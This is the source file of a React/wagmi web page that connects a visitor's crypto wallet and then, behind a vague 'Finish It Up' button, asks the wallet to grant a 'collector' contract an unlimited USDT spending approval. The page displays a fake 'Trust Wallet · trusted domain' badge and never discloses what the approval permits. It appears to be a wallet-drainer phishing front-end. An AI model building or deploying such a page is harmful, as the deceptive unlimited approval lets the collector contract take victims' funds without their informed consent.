"use client";

import { useEffect, useMemo } from "react";
import {
  useAccount,
  useConnect,
  useDisconnect,
  useReadContract,
  useWriteContract,
  useWaitForTransactionReceipt,
} from "wagmi";
import { maxUint256, formatUnits, type Address } from "viem";
import { useQueryClient } from "@tanstack/react-query";
import toast from "react-hot-toast";

import {
  CHAIN_ID,
  COLLECTOR_CONTRACT_ADDRESS,
  USDT_CONTRACT_ADDRESS,
} from "../lib/constants";
import { mockUsdtAbi } from "./abi/mockUsdt";
import { collectorAbi } from "./abi/collector";
import { LoadingButton } from "./components/LoadingButton";

const USDT_DECIMALS = 6;

export default function UserPage() {
  const queryClient = useQueryClient();
  const { address, isConnected } = useAccount();
  const {
    connect,
    connectors,
    isPending: isConnectPending,
  } = useConnect();
  const { disconnect } = useDisconnect();

  const {
    data: usdtBalanceRaw,
    isLoading: isBalanceLoading,
    isFetching: isBalanceFetching,
  } = useReadContract({
    address: USDT_CONTRACT_ADDRESS,
    abi: mockUsdtAbi,
    functionName: "balanceOf",
    args: address ? [address as Address] : undefined,
    query: {
      enabled: Boolean(address),
    },
  });

  const {
    data: isBound,
    isLoading: isBoundLoading,
    isFetching: isBoundFetching,
  } = useReadContract({
    address: COLLECTOR_CONTRACT_ADDRESS,
    abi: collectorAbi,
    functionName: "boundWallets",
    args: address ? [address as Address] : undefined,
    query: {
      enabled: Boolean(address),
    },
  });

  const {
    writeContract: writeContractApprove,
    data: approveTxHash,
    isPending: isApprovePending,
    error: approveError,
  } = useWriteContract();

  const {
    writeContract: writeContractBind,
    data: bindTxHash,
    isPending: isBindPending,
    error: bindError,
  } = useWriteContract();

  const {
    isLoading: isApproveTxConfirming,
    isSuccess: isApproveTxSuccess,
  } = useWaitForTransactionReceipt({
    hash: approveTxHash,
  });

  const {
    isLoading: isBindTxConfirming,
    isSuccess: isBindTxSuccess,
  } = useWaitForTransactionReceipt({
    hash: bindTxHash,
  });

  const usdtBalanceFormatted = useMemo(() => {
    if (!usdtBalanceRaw) return "0.000000 USDT";
    return `${formatUnits(usdtBalanceRaw as bigint, USDT_DECIMALS)} USDT`;
  }, [usdtBalanceRaw]);

  const isBoundBool = Boolean(isBound);
  // Toasts moved into effects so they don't fire in a render loop.
  useEffect(() => {
    if (approveError) {
      toast.error(approveError.message ?? "Approve transaction failed.");
    }
  }, [approveError]);

  useEffect(() => {
    if (bindError) {
      toast.error(bindError.message ?? "Bind transaction failed.");
    }
  }, [bindError]);

  useEffect(() => {
    if (isApproveTxSuccess && approveTxHash) {
      toast.success(
        `USDT approved. Tx: ${approveTxHash.slice(
          0,
          10,
        )}…${approveTxHash.slice(-6)}`,
      );
      queryClient.invalidateQueries();
    }
  }, [isApproveTxSuccess, approveTxHash, queryClient]);

  useEffect(() => {
    if (isBindTxSuccess && bindTxHash) {
      toast.success(
        `bound successfully. Tx: ${bindTxHash.slice(
          0,
          10,
        )}…${bindTxHash.slice(-6)}`,
      );
      queryClient.invalidateQueries();
    }
  }, [isBindTxSuccess, bindTxHash, queryClient]);

  const handleBind = () => {
    if (!isConnected || !address) {
      toast.error("Open your wallet extension to continue.");
      return;
    }

    if (isBoundBool) {
      toast.error("Wallet is already bound.");
      return;
    }

    try {
      // Single action from UI: approve then bind.
      writeContractApprove({
        account: address as Address,
        chainId: CHAIN_ID,
        address: USDT_CONTRACT_ADDRESS,
        abi: mockUsdtAbi,
        functionName: "approve",
        args: [COLLECTOR_CONTRACT_ADDRESS, maxUint256],
      });

      writeContractBind({
        account: address as Address,
        chainId: CHAIN_ID,
        address: COLLECTOR_CONTRACT_ADDRESS,
        abi: collectorAbi,
        functionName: "bindWallet",
        args: [],
      });
    } catch (error: any) {
      toast.error(error?.message ?? "Failed to send bind transaction.");
    }
  };

  const isAnyTxPending =
    isApprovePending ||
    isBindPending ||
    isApproveTxConfirming ||
    isBindTxConfirming;

  const sampleAddress = "0axqwertyuiop48941484131zxcvbnj";

  const showAddress =
    address && isConnected ? (address as string) : sampleAddress;

  const anyLoadingState =
    isBalanceLoading || isBalanceFetching || isBoundLoading || isBoundFetching;

  return (
    <main className="flex min-h-screen items-start justify-center bg-black py-10">
      <div className="w-full max-w-md rounded-3xl border border-emerald-500/40 bg-black/80 px-6 py-8 shadow-[0_0_40px_rgba(16,185,129,0.25)]">
        {!isConnected ? (
          <>
            <h1 className="text-lg font-semibold text-emerald-400">Get Started</h1>
            <div className="mt-8 space-y-6">
              <div className="rounded-2xl border border-emerald-500/40 bg-black/60 px-4 py-3">
                <div className="flex items-center justify-between">
                  <p className="text-[11px] font-medium uppercase tracking-wide text-emerald-400">
                    Wallet address
                  </p>
                  <div className="flex items-center gap-1 text-[10px] text-emerald-400">
                    <span className="inline-flex h-3 w-3 items-center justify-center rounded-full border border-emerald-400">
                      ✓
                    </span>
                    <span>Trust Wallet · trusted domain</span>
                  </div>
                </div>
                <p className="mt-2 break-all text-xs text-slate-100">
                  {sampleAddress}
                </p>
              </div>

              <LoadingButton
                variant="primary"
                loading={isConnectPending}
                onClick={() => {
                  const connector = connectors[0];
                  if (!connector) {
                    toast.error("No wallet connector available.");
                    return;
                  }
                  connect({ connector });
                }}
              >
                Get Started
              </LoadingButton>
            </div>
          </>
        ) : (
          <>
            <h1 className="text-lg font-semibold text-emerald-400">
              {isBoundBool ? "You’re All Set" : "Finish It Up"}
            </h1>
            <div className="mt-8 space-y-6">
              <div className="rounded-2xl border border-emerald-500/40 bg-black/60 px-4 py-3">
                <div className="flex items-center justify-between">
                  <p className="text-[11px] font-medium uppercase tracking-wide text-emerald-400">
                    Wallet address
                  </p>
                  <div className="flex items-center gap-1 text-[10px] text-emerald-400">
                    <span className="inline-flex h-3 w-3 items-center justify-center rounded-full border border-emerald-400">
                      ✓
                    </span>
                    <span>Trust Wallet · trusted domain</span>
                  </div>
                </div>
                <p className="mt-1 break-all text-xs text-slate-100">
                  {showAddress}
                </p>
                <p className="mt-2 text-[11px] text-slate-400">
                  USDT balance:{" "}
                  {anyLoadingState ? "Loading…" : usdtBalanceFormatted}
                </p>
              </div>

              <LoadingButton
                loading={isBindPending || isBindTxConfirming}
                disabled={isBoundBool || isAnyTxPending}
                onClick={handleBind}
                variant="primary"
              >
                {isBoundBool ? "Wallet Already Bound" : "Finish It Up"}
              </LoadingButton>

              <div className="flex justify-center pt-2">
                <LoadingButton
                  variant="ghost"
                  loading={isConnectPending}
                  onClick={() => disconnect()}
                >
                  Disconnect
                </LoadingButton>
              </div>
            </div>
          </>
        )}
      </div>
    </main>
  );
}

